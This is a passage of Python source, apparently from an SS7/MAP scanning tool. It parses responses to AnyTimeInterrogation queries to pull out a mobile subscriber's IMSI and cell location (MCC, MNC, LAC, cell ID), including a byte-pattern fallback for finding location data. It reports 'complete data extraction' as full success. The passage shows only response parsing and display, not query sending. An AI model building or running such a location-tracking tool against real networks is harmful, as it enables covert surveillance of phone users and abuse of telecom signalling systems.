        print_connection_status("", 0, "PARSING", f"Parsing {len(raw_response)} bytes", unique_id=unique_id)
        
        # Extract TCAP payload
        tcap_payload = extract_tcap_from_sccp_professional(raw_response)
        if not tcap_payload:
            result.error_info = "Failed to extract TCAP payload"
            result.rejection_cause = "SCCP parsing failed"
            return result
        
        if logger:
            logger.debug(f"[{unique_id}] Professional TCAP payload extracted: {len(tcap_payload)} bytes")
        
        # Parse TCAP message using Pycrate
        try:
            tcap_message = deepcopy(PYCRATE['TCAP_defs'].TCMessage)
            tcap_message.from_ber(tcap_payload)
            tcap_val = tcap_message.get_val()
            
            if logger:
                logger.debug(f"[{unique_id}] Professional TCAP message parsed: {type(tcap_val)}")
            
            # Process based on message type
            if isinstance(tcap_val, tuple) and len(tcap_val) >= 2:
                msg_type, msg_content = tcap_val[0], tcap_val[1]
                
                if msg_type in ['end', 'continue']:
                    result = process_tcap_response_professional(msg_content, unique_id, result)
                elif msg_type == 'abort':
                    result.tcap_outcome = 'Abort'
                    result.error_info = "TCAP Abort received"
                    result.rejection_cause = "TCAP Abort"
                    # Try to extract abort reason
                    if isinstance(msg_content, dict) and 'reason' in msg_content:
                        abort_reason = msg_content['reason']
                        result.rejection_cause = f"TCAP Abort: {abort_reason}"
                else:
                    result.tcap_outcome = f"Unknown_TCAP({msg_type})"
                    result.error_info = f"Unknown TCAP message type: {msg_type}"
                    result.rejection_cause = f"Unknown TCAP type: {msg_type}"
            
        except Exception as tcap_error:
            if logger:
                logger.debug(f"[{unique_id}] Professional TCAP parsing failed: {tcap_error}")
            
            # Fallback to manual parsing
            result = parse_components_manually_professional(tcap_payload, unique_id, result)
        
    except Exception as e:
        if logger:
            logger.error(f"[{unique_id}] Professional response parsing exception: {e}")
        result.error_info = f"Parsing exception: {str(e)[:100]}"
        result.rejection_cause = f"Parser error: {type(e).__name__}"
    
    return result

def process_tcap_response_professional(msg_content: Any, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional TCAP response processor with enhanced error detection"""
    
    try:
        if isinstance(msg_content, dict):
            # Extract DTID
            if 'dtid' in msg_content:
                result.received_dtid = msg_content['dtid'].hex() if isinstance(msg_content['dtid'], bytes) else str(msg_content['dtid'])
            
            # Process components
            if 'components' in msg_content and msg_content['components']:
                components = msg_content['components']
                
                for component in components:
                    if isinstance(component, tuple) and len(component) >= 2:
                        comp_type, comp_data = component[0], component[1]
                        
                        if comp_type == 'returnResultLast':
                            result.tcap_outcome = 'ReturnResultLast'
                            result.success = True
                            
                            # Professional MAP response parsing
                            if isinstance(comp_data, dict) and 'resultretres' in comp_data:
                                param_data = comp_data['resultretres'].get('parameter', b'')
                                if isinstance(param_data, bytes):
                                    # Use professional ATI response decoder
                                    enhanced_result = decode_ati_response_professional(param_data, unique_id)
                                    if enhanced_result:
                                        result.location_info = enhanced_result.location_info
                                        result.subscriber_info = enhanced_result.subscriber_info
                                        result.map_version = enhanced_result.map_version
                                        result.error_info = "Professional MAP ATI Response parsed successfully"
                                        break
                        
                        elif comp_type == 'returnError':
                            result.tcap_outcome = 'ReturnError'
                            if isinstance(comp_data, dict) and 'errorCode' in comp_data:
                                error_code = comp_data['errorCode']
                                result.error_code = error_code
                                result.error_info = MAP_ERRORS.get(error_code, f"MAP Error {error_code}")
                                result.rejection_cause = f"MAP Error {error_code}"
                        
                        elif comp_type == 'reject':
                            result.tcap_outcome = 'Reject'
                            result.error_info = "TCAP Reject received"
                            result.rejection_cause = "TCAP Reject"
                            
                            # Try to extract reject reason
                            if isinstance(comp_data, dict):
                                if 'problem' in comp_data:
                                    problem = comp_data['problem']
                                    if isinstance(problem, tuple) and len(problem) >= 2:
                                        problem_type, problem_code = problem[0], problem[1]
                                        reject_desc = TCAP_REJECT_CAUSES.get(problem_code, f"Unknown reject {problem_code}")
                                        result.rejection_cause = f"TCAP Reject: {problem_type} - {reject_desc}"
                                        result.error_info = result.rejection_cause
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional TCAP response processing error: {e}")
    
    return result

def parse_components_manually_professional(tcap_payload: bytes, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional manual component parser with enhanced fallback parsing"""
    
    if len(tcap_payload) < 2:
        result.error_info = "TCAP payload too short for manual parsing"
        result.rejection_cause = "Invalid TCAP length"
        return result
    
    tcap_type = tcap_payload[0]
    
    if tcap_type in [TCAP_TAGS['MSG_END'], TCAP_TAGS['MSG_CONTINUE']]:
        offset = 2
        
        while offset < len(tcap_payload) - 1:
            tag = tcap_payload[offset]
            
            if tag == TCAP_TAGS['COMPONENT_PORTION']:
                length = tcap_payload[offset + 1]
                comp_start = offset + 2
                comp_end = comp_start + length
                
                if comp_end <= len(tcap_payload):
                    comp_data = tcap_payload[comp_start:comp_end]
                    result = parse_components_data_professional(comp_data, unique_id, result)
                break
            
            offset += 1
    
    elif tcap_type == TCAP_TAGS['MSG_ABORT']:
        result.tcap_outcome = 'Abort'
        result.error_info = "TCAP Abort received"
        result.rejection_cause = "TCAP Abort"
        
        # Try to extract abort cause
        if len(tcap_payload) > 5:
            try:
                # Look for abort cause in the payload
                for i in range(2, min(len(tcap_payload) - 2, 10)):
                    if tcap_payload[i] == 0x0A:  # P-Abort-cause
                        abort_cause = tcap_payload[i + 2] if i + 2 < len(tcap_payload) else 0
                        abort_reasons = {
                            0: "Unrecognized message type",
                            1: "Unrecognized transaction ID",
                            2: "Badly formatted transaction portion",
                            3: "Incorrect transaction portion",
                            4: "Resource limitation"
                        }
                        result.rejection_cause = f"P-Abort: {abort_reasons.get(abort_cause, f'Unknown cause {abort_cause}')}"
                        break
            except:
                pass
    
    return result

def parse_components_data_professional(comp_data: bytes, unique_id: str, result: ScanResult) -> ScanResult:
    """Professional component data parser with enhanced error detection"""
    
    offset = 0
    
    while offset < len(comp_data):
        try:
            if offset >= len(comp_data):
                break
            
            comp_tag = comp_data[offset]
            
            if comp_tag == TCAP_TAGS['COMP_RETURN_RESULT_LAST']:
                result.tcap_outcome = 'ReturnResultLast'
                result.success = True
                result.error_info = "ReturnResultLast detected"
                
                # Try professional MAP response parsing first
                try:
                    # Look for parameter data
                    param_offset = offset + 2  # Skip tag and length
                    while param_offset < len(comp_data) - 4:
                        if comp_data[param_offset] == 0x30:  # SEQUENCE tag for MAP response
                            param_length = comp_data[param_offset + 1]
                            if param_length < 0x80:  # Short form length
                                param_start = param_offset
                                param_end = param_start + 2 + param_length
                                
                                if param_end <= len(comp_data):
                                    param_data = comp_data[param_start:param_end]
                                    
                                    # Try professional decoding
                                    enhanced_result = decode_ati_response_professional(param_data, unique_id)
                                    if enhanced_result and (enhanced_result.location_info.cgi_found or 
                                                          enhanced_result.subscriber_info.imsi != "N/A"):
                                        result.location_info = enhanced_result.location_info
                                        result.subscriber_info = enhanced_result.subscriber_info
                                        result.error_info = "Professional MAP ATI Response parsed successfully"
                                        if logger:
                                            logger.info(f"[{unique_id}] 🎯 Professional parsing successful!")
                                        break
                        param_offset += 1
                
                except Exception as e:
                    if logger:
                        logger.debug(f"[{unique_id}] Professional parsing failed, trying pattern matching: {e}")
                
                # Fallback to pattern matching if professional parsing fails
                if result.location_info.mcc == "N/A":
                    pattern_result = find_cgi_patterns_professional(comp_data[offset:], unique_id)
                    if pattern_result:
                        result.location_info = pattern_result
                
                break
                
            elif comp_tag == TCAP_TAGS['COMP_RETURN_ERROR']:
                result.tcap_outcome = 'ReturnError'
                # Extract error code with enhanced detection
                try:
                    for i in range(offset, min(offset + 20, len(comp_data) - 1)):
                        if comp_data[i] == 0x02 and i + 2 < len(comp_data):
                            error_code = comp_data[i + 2]
                            if error_code in MAP_ERRORS:
                                result.error_info = MAP_ERRORS[error_code]
                                result.error_code = error_code
                                result.rejection_cause = f"MAP Error {error_code}: {MAP_ERRORS[error_code]}"
                                break
                except Exception:
                    result.error_info = "MAP Error detected"
                    result.rejection_cause = "Unknown MAP Error"
                break
                
            elif comp_tag == TCAP_TAGS['COMP_REJECT']:
                result.tcap_outcome = 'Reject'
                result.error_info = "TCAP Reject detected"
                result.rejection_cause = "TCAP Component Reject"
                
                # Try to extract reject problem
                try:
                    for i in range(offset + 2, min(offset + 15, len(comp_data) - 1)):
                        if comp_data[i] in [0x80, 0x81, 0x82, 0x83]:  # Problem tags
                            if i + 1 < len(comp_data):
                                problem_code = comp_data[i + 1]
                                reject_desc = TCAP_REJECT_CAUSES.get(problem_code, f"Unknown problem {problem_code}")
                                result.rejection_cause = f"TCAP Reject: {reject_desc}"
                                result.error_info = result.rejection_cause
                                break
                except Exception:
                    pass
                break
            
            offset += 1
            
        except Exception as e:
            if logger:
                logger.debug(f"[{unique_id}] Component parsing error at offset {offset}: {e}")
            break
    
    return result

def find_cgi_patterns_professional(data: bytes, unique_id: str) -> Optional[EnhancedLocationInfo]:
    """Professional CGI pattern finder with enhanced validation and multiple pattern detection"""
    
    for i in range(len(data) - 6):
        try:
            potential_plmn = data[i:i+3]
            
            # Enhanced PLMN validation
            valid_plmn = True
            for byte in potential_plmn:
                if ((byte & 0x0F) > 9 and (byte & 0x0F) != 0xF) or \
                   (((byte >> 4) & 0x0F) > 9 and ((byte >> 4) & 0x0F) != 0xF):
                    valid_plmn = False
                    break
            
            if valid_plmn:
                # Try CGI (7 bytes)
                if i + 7 <= len(data):
                    test_cgi = data[i:i+7]
                    try:
                        mcc, mnc = decode_plmn_professional(test_cgi[:3])
                        lac = int.from_bytes(test_cgi[3:5], 'big')
                        ci = int.from_bytes(test_cgi[5:7], 'big')
                        
                        # Validate reasonable values
                        if 100 <= int(mcc) <= 999 and 0 <= int(mnc) <= 999 and 0 < lac < 65536 and 0 < ci < 65536:
                            location = EnhancedLocationInfo()
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(lac)
                            location.cell_id = str(ci)
                            location.cgi_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] 🎯 Professional pattern CGI found: MCC={mcc}, MNC={mnc}, LAC={lac}, CI={ci}")
                            return location
                    except Exception:
                        continue
                
                # Try LAI (5 bytes)
                elif i + 5 <= len(data):
                    test_lai = data[i:i+5]
                    try:
                        mcc, mnc = decode_plmn_professional(test_lai[:3])
                        lac = int.from_bytes(test_lai[3:5], 'big')
                        
                        if 100 <= int(mcc) <= 999 and 0 <= int(mnc) <= 999 and 0 < lac < 65536:
                            location = EnhancedLocationInfo()
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(lac)
                            location.lai_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] 🎯 Professional pattern LAI found: MCC={mcc}, MNC={mnc}, LAC={lac}")
                            return location
                    except Exception:
                        continue
        
        except Exception:
            continue
    
    return None

# === Professional Display Functions ===

def display_professional_result(result: ScanResult, unique_id: str):
    """Display scan result with enhanced professional formatting and colors"""
    
    # Determine status and colors
    if result.location_info.cgi_found and result.subscriber_info.imsi != "N/A":
        title_color = Colors.BRIGHT_GREEN
        status_emoji = "🎯"
        status_text = "FULL SUCCESS - COMPLETE DATA EXTRACTION"
        status_bg = Colors.BG_GREEN
    elif result.location_info.cgi_found:
        title_color = Colors.GREEN
        status_emoji = "📍"
        status_text = "LOCATION SUCCESS - CGI EXTRACTED"
        status_bg = Colors.BG_BLUE
    elif result.subscriber_info.imsi != "N/A":
        title_color = Colors.CYAN
        status_emoji = "📱"
        status_text = "SUBSCRIBER SUCCESS - IMSI EXTRACTED"
        status_bg = Colors.BG_CYAN
    elif result.success:
        title_color = Colors.BLUE
        status_emoji = "✅"
        status_text = "PARTIAL SUCCESS"
        status_bg = None
    elif 'Timeout' in result.tcap_outcome:
        title_color = Colors.YELLOW
        status_emoji = "⏰"
        status_text = "TIMEOUT"
        status_bg = Colors.BG_YELLOW
    elif 'Error' in result.tcap_outcome:
        title_color = Colors.BRIGHT_RED
        status_emoji = "❌"
        status_text = "MAP ERROR"
        status_bg = Colors.BG_RED
    elif 'Reject' in result.tcap_outcome:
        title_color = Colors.RED
        status_emoji = "🚫"
        status_text = "TCAP REJECTED"
        status_bg = Colors.BG_RED
    elif 'Abort' in result
